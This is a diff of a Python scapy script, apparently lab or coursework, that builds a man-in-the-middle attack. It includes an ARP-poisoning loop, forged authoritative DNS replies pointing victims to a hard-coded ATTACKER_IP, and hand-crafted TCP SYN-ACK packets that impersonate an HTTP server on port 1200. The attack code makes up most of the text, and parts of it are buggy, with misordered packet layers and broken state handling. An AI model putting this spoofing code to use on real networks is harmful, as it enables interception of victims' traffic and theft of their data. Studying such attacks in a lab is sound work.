@@ -7,9 +7,11 @@ from scapy.layers.dns import DNS
 from scapy.layers.inet import UDP, TCP, IP
 from scapy.layers.l2 import Ether, ARP
 from scapy.layers.dns import DNSRR
+import random
+import socket
 
+ATTACKER_IP = "172.21.255.245"
 INTERFACE = "eth0"
-http_server_state = 0
 
 class TCPServerState:
     LISTEN = 0,
@@ -18,7 +20,7 @@ class TCPServerState:
     # graceful close
     FIN_WAIT = 3
 
-
+http_server_state = TCPServerState.LISTEN
 
 def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, target_ip_addr: str, gw_ip_address: str) -> None:
     while True:
@@ -33,10 +35,10 @@ def on_dns_packet(p: Packet) -> None:
     #if p[DNS].qr == 1:
 
     if p[DNS].qr == 0:
-        print("packet received: ")
+        #print("packet received: ")
         #p.show()
         print("sending packet: ")
-        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(src=p[Ether].dst, dst=p[Ether].src) / DNS(qr=1, aa=0,id=p[DNS].id, an=DNSRR(rdata=("0:0:0:0:0:ffff:ac12:0003")))
+        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(src=p[Ether].dst, dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
         #response.show()
         sendp(response, iface=INTERFACE)
 
@@ -45,29 +47,47 @@ def on_http_packet(p: Packet) -> None:
     assert IP in p
     assert TCP in p
     assert p[TCP].dport == 1200
-
-    if http_server_state == TCPServerState.LISTEN:
-        # recv SYN
+    #print("received packet:")
+    #print(p.show())
+    if http_server_state == TCPServerState.LISTEN: # Listening 
         if p[TCP].flags == 'S':
             # send back SYN-ACK
             # ACK sequence + 1, pick random ISN
-            r = sr1(Ether(src=p[Ether].dst, dst=p[Ether].src) 
-                / IP(dst=p[IP].src, src=p[IP].dst) 
-                / TCP(flags='SA', dport=1200))
-            sendp(r, iface=INTERFACE)
-            http_server_state = TCPServerState.SYN_RECIEVED
+            print("packet received:")
+            print(p.show())
+            #r = #(Ether(src=p[Ether].dst, dst=p[Ether].src) 
+            #r = IP(dst=p[IP].src, src=p[IP].dst)/TCP(flags='SA', dport=p[TCP].sport, sport=1200, ack=p[TCP].seq + 1, seq=random.randrange(1000,2000))
+            seq_num = int(p[TCP].seq)
+            r = (Ether(dst=p[Ether].src, src=p[Ether].dst)/(IP(dst=p[IP].src, src=p[IP].dst)/TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags='SA', seq=random.randrange(0,(2**32) - 1), ack=seq_num+1)))
+            print("sending packet:")
+            print(r.show())
+            #s = socket.create_connection((p[IP].src, p[TCP].sport))
+            #s.sendall(r)
+            #s.close()
+            sendp(r, INTERFACE)
+            #http_server_state = TCPServerState.SYN_RECIEVED
             pass
-        else:
-            logging.error("espected SYN packet")
+        elif p[TCP].flags == 'R':
+            print("received a RST packet")
+        elif p[TCP].flags == 'A':
+            print("received an ACK packet!!!")
 
     elif http_server_state == TCPServerState.SYN_RECIEVED:
+        #print(p.show())
         # recv ACK
         if p[TCP].flags == 'A':
+            print("received an ACK")
+            print(p.show())
             http_server_state = TCPServerState.ESTABLISHED
-        pass
+        else:
+            print("failed")
     pass
 
 def on_packet(p: Packet) -> None:
+    #if IP in p:
+     #   print("getting IPv4 packet")
+    #elif IPv6 in p:
+     #   print("getting IPv6 packet")
     if TCP in p and p[TCP].dport == 1200:
         print("getting http packet")
         on_http_packet(p)
